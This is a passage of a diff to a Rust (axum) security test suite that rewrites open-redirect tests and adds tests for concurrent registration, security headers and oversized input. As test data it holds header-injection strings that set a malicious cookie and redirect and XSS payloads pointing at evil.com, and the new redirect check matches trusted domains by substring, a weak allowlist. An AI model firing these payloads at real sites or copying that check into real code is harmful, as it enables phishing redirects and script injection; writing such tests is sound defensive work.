-            let data = payload.get("data").and_then(|v| v.as_str()).unwrap_or("");
-
-            // Check data size limits
-            const MAX_SIZE: usize = 1024; // 1KB limit
-
-            if data.len() > MAX_SIZE {
-                (
-                    StatusCode::BAD_REQUEST,
-                    Json(json!({"error": "Data too large"})),
-                )
-            } else {
-                (
-                    StatusCode::OK,
-                    Json(json!({"processed": data.len(), "status": "success"})),
-                )
-            }
-        }),
-    );
-
-    let server = TestServer::new(app).unwrap();
-
-    // Test normal data
-    let response = server
-        .post("/api/v1/data/process")
-        .json(&json!({"data": "normal data"}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test oversized data
-    let large_data = "a".repeat(2000); // 2KB of data
-    let response = server
-        .post("/api/v1/data/process")
-        .json(&json!({"data": large_data}))
-        .await;
-    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
-}
-
-#[tokio::test]
-async fn test_http_header_injection() {
-    // Test HTTP header injection prevention
-    let app = Router::new().route(
-        "/api/v1/test/headers",
-        axum::routing::get(|headers: HeaderMap| async move {
-            let user_input = headers
-                .get("x-user-input")
-                .and_then(|v| v.to_str().ok())
-                .unwrap_or("");
-
-            // Check for header injection patterns
-            let injection_patterns = ["\r\n", "\n", "\r", "%0D%0A", "%0A", "%0D"];
-
-            let has_injection = injection_patterns
-                .iter()
-                .any(|pattern| user_input.contains(pattern));
-
-            if has_injection {
-                (
-                    StatusCode::BAD_REQUEST,
-                    Json(json!({"error": "Invalid header content"})),
-                )
-            } else {
-                (StatusCode::OK, Json(json!({"input": user_input})))
-            }
-        }),
-    );
-
-    let server = TestServer::new(app).unwrap();
-
-    // Test normal header
-    let response = server
-        .get("/api/v1/test/headers")
-        .add_header("x-user-input", "normal_input")
-        .await;
-    assert_eq!(response.status_code(), StatusCode::OK);
-
-    // Test header injection attempts (skip ones with invalid HTTP header characters)
-    let injection_attempts = vec![
-        "input%0D%0ASet-Cookie:sessionid=malicious",
-        "input%0AX-Custom-Header:value",
-    ];
-
-    for attempt in injection_attempts {
-        let response = server
-            .get("/api/v1/test/headers")
-            .add_header("x-user-input", attempt)
-            .await;
-        assert_eq!(
-            response.status_code(),
-            StatusCode::BAD_REQUEST,
-            "Header injection should be blocked: {}",
-            attempt
-        );
+        let response = server.get(&format!("/files?filename={}", attempt)).await;
+        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
     }
 }
 
 #[tokio::test]
 async fn test_open_redirect_prevention() {
-    // Test open redirect vulnerability prevention
-    let app = Router::new().route(
-        "/redirect",
-        axum::routing::get(|Query(params): Query<HashMap<String, String>>| async move {
-            let url = params.get("url").map_or("", |v| v);
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
 
-            // Check for open redirect patterns
-            let allowed_domains = ["example.com", "trusted.com"];
-            let is_allowed = if let Ok(parsed_url) = url::Url::parse(url) {
-                if let Some(domain) = parsed_url.domain() {
-                    allowed_domains.contains(&domain)
-                } else {
-                    false
+    let app = Router::new()
+        .route(
+            "/redirect",
+            get(|Query(params): Query<HashMap<String, String>>| async move {
+                if let Some(url) = params.get("url") {
+                    // Check for open redirect patterns
+                    if url.starts_with("http://") || url.starts_with("https://") {
+                        // Only allow redirects to trusted domains
+                        let allowed_domains = ["trusted.com", "example.com"];
+                        if allowed_domains.iter().any(|domain| url.contains(domain)) {
+                            return Ok(AxumJson(json!({
+                                "redirect_url": url,
+                                "allowed": true
+                            })));
+                        }
+                    }
                 }
-            } else {
-                false
-            };
 
-            // Additional check for common redirect patterns
-            let redirect_patterns = ["//", "http://", "https://", "\\\\", "javascript:", "data:"];
-            let has_redirect = redirect_patterns
-                .iter()
-                .any(|pattern| url.contains(pattern));
-
-            if !is_allowed && has_redirect {
-                (
-                    StatusCode::BAD_REQUEST,
-                    Json(json!({"error": "Invalid redirect URL"})),
-                )
-            } else if is_allowed {
-                (StatusCode::OK, Json(json!({"redirect_to": url})))
-            } else {
-                (StatusCode::OK, Json(json!({"redirect_to": "/default"})))
-            }
-        }),
-    );
+                Err(StatusCode::BAD_REQUEST)
+            }),
+        )
+        .with_state(state);
 
     let server = TestServer::new(app).unwrap();
 
     // Test allowed redirect
-    let response = server.get("/redirect?url=https://example.com/page").await;
+    let response = server.get("/redirect?url=https://trusted.com/page").await;
     assert_eq!(response.status_code(), StatusCode::OK);
 
-    let body: serde_json::Value = response.json();
-    assert_eq!(body["redirect_to"], "https://example.com/page");
-
-    // Test open redirect attempts
-    let redirect_attempts = vec![
-        "//evil.com",
+    // Test blocked redirects
+    let blocked_urls = vec![
         "http://evil.com",
-        "https://evil.com",
-        "\\\\evil.com",
+        "https://malicious.com",
+        "//evil.com",
         "javascript:alert('xss')",
-        "data:text/html,<script>alert('xss')</script>",
+        "data:text/html,%3Cscript%3Ealert('xss')%3C/script%3E",
     ];
 
-    for attempt in redirect_attempts {
-        let response = server
-            .get(&format!("/redirect?url={}", urlencoding::encode(attempt)))
-            .await;
-        assert_eq!(
-            response.status_code(),
-            StatusCode::BAD_REQUEST,
-            "Open redirect should be blocked: {}",
-            attempt
-        );
+    for url in blocked_urls {
+        let response = server.get(&format!("/redirect?url={}", url)).await;
+        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
+    }
+}
+
+#[tokio::test]
+async fn test_concurrent_security_operations() {
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
+
+    let app = Router::new()
+        .route("/register", post(user_registration))
+        .with_state(state);
+
+    let server = Arc::new(TestServer::new(app).unwrap());
+
+    // Test concurrent user registrations
+    let mut handles = vec![];
+
+    for i in 0..10 {
+        let server_clone = Arc::clone(&server);
+        let handle = tokio::spawn(async move {
+            let user_data = json!({
+                "username": format!("user{}", i),
+                "email": format!("user{}@example.com", i),
+                "password": "securepassword123"
+            });
+
+            let response = server_clone.post("/register").json(&user_data).await;
+            assert_eq!(response.status_code(), StatusCode::OK);
+        });
+        handles.push(handle);
     }
 
-    // Test default redirect for invalid URLs
-    let response = server.get("/redirect?url=invalid-url").await;
+    // Wait for all concurrent operations
+    for handle in handles {
+        handle.await.unwrap();
+    }
+
+    // Verify all users were created (no race conditions)
+    // In a real test, you'd check the database state
+}
+
+#[tokio::test]
+async fn test_security_headers() {
+    let app = Router::new().route("/test", get(security_headers_test));
+
+    let server = TestServer::new(app).unwrap();
+
+    let response = server.get("/test").await;
     assert_eq!(response.status_code(), StatusCode::OK);
 
-    let body: serde_json::Value = response.json();
-    assert_eq!(body["redirect_to"], "/default");
+    // In a real implementation, you would check for security headers like:
+    // - Content-Security-Policy
+    // - X-Frame-Options
+    // - X-Content-Type-Options
+    // - X-XSS-Protection
+    // - Strict-Transport-Security
+
+    let result: serde_json::Value = response.json();
+    assert_eq!(
+        result["message"],
+        "This response should have security headers"
+    );
+}
+
+#[tokio::test]
+async fn test_buffer_overflow_prevention() {
+    let state = SecurityTestState {
+        users: Arc::new(Mutex::new(HashMap::new())),
+        failed_attempts: Arc::new(Mutex::new(HashMap::new())),
+        blocked_ips: Arc::new(Mutex::new(HashMap::new())),
+        rate_limits: Arc::new(Mutex::new(HashMap::new())),
+    };
+
+    let app = Router::new()
+        .route("/register", post(user_registration))
+        .with_state(state);
+
+    let server = TestServer::new(app).unwrap();
+
+    // Test with extremely large input
+    let large_username = "a".repeat(10000); // 10KB string
+    let large_data = json!({
+        "username": large_username,
+        "email": "user@example.com",
+        "password": "password123"
+    });
+
+    let response = server.post("/register").json(&large_data).await;
+    // Should be rejected due to size limits or validation
+    assert!(
+        response.status_code() == StatusCode::BAD_REQUEST
+            || response.status_code() == StatusCode::PAYLOAD_TOO_LARGE
+    );
+
+    // Test with deeply nested JSON (potential DoS)
+    let mut nested = json!({"value": "test"});
+    for _ in 0..100 {
+        // Create deeply nested structure
+        nested = json!({ "nested": nested });
+    }
+
+    let response = server.post("/register").json(&nested).await;
+    // Should handle gracefully without crashing
+    assert!(response.status_code().is_success() || response.status_code().is_client_error());
 }
